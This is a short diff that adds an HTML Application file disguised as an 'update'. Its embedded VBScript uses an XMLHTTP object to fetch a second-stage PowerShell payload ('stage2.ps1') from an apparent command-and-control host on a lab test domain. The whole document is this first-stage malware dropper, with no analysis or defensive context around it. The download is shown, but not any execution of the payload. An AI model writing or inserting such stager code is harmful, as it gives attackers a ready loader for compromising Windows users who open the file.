@@ -1,0 +1,6 @@
+<hta:application id="app" applicationname="update"/>
+<script language="VBScript">
+Set x = CreateObject("Msxml2.ServerXMLHTTP")
+x.Open "GET", "http://c2.lab.test/stage2.ps1", False
+x.Send
+</script>
